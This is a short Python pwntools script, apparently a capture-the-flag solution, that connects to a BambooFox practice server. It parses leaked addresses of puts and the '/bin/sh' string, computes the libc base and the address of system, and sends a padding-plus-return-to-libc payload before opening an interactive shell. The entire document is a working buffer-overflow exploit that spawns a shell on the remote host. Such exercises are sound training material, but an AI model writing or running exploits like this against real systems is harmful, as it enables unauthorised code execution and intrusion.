#!/usr/bin/env python3

from pwn import *

r = remote(host="bamboofox.cs.nctu.edu.tw", port=11002)
#r = remote(host="localhost", port=11000)


# Exploit here
ret = r.recvuntil(b"The address of \"/bin/sh\" is ")
ret = r.recvuntil(b"\n")
str_addr = int(ret.split(b"\n")[0], 16)
print(ret)
print(str_addr)

ret = r.recvuntil(b"The address of function \"puts\" is ")
ret = r.recvuntil(b"\n")
puts_addr = int(ret.split(b"\n")[0], 16)
print(ret)
print(puts_addr)

puts_offset = 0x00064da0
system_offset = 0x0003fe70
base_addr = puts_addr - puts_offset
system_addr = base_addr + system_offset

# send the payload
data = b"AAAA"*8 + system_addr.to_bytes(4, "little") + b"AAAA" + str_addr.to_bytes(4, "little")
print(data)
r.sendline(data)

r.interactive()
